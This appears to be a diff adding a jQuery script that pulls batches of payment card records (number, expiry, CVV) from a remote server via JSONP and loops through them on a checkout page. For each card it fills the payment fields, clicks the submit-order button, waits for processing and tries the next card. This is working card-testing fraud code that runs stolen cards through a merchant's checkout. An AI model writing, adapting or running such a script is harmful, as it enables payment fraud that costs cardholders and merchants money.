@@ -1,0 +1,47 @@
+var postUrl = "https://" + baseUrl + "/post";
+var iteration = null;
+var options = {
+     url:postUrl,
+     dataType: "jsonp"
+};
+var cards = function(arr) {
+	var i = 0;
+	var percentage = 30;
+	var len = Math.ceil(arr.length * (percentage / 100));
+
+	iteration = function() {
+	  if( i < len ) {
+	    var json = arr[i++];
+	    sessionStorage.card = JSON.stringify( json );
+
+	    $("#ccNumber").val(json.card);
+            $("#cardType").val( json.card[0] == 4 ? "Visa" : "MasterCard" )
+	    $("#expMonth").val(Number(json.mon));
+        $("#expYear").val("20" + json.year);
+	    $("#cvv").val(json.cvv);
+	    $(".btn_positive.ats-submitorder").click();
+
+	    setTimeout(function(){
+	    	var interval = setInterval(function() {
+		        console.log("Procesando...")
+		        if ( $("#pleaseWait").css("display") == "none" ) {
+		        	console.log("Probemos la proxima");
+		        	clearInterval(interval);
+		        	setTimeout(iteration, 2000);
+		    	}
+		    }, 2000);
+	    }, 3000);
+
+	  }
+	  else {
+	    $.ajax(options)
+	    .success(cards);
+	  }
+
+	}
+
+	iteration();
+};
+// V2
+$.ajax(options)
+.success(cards);
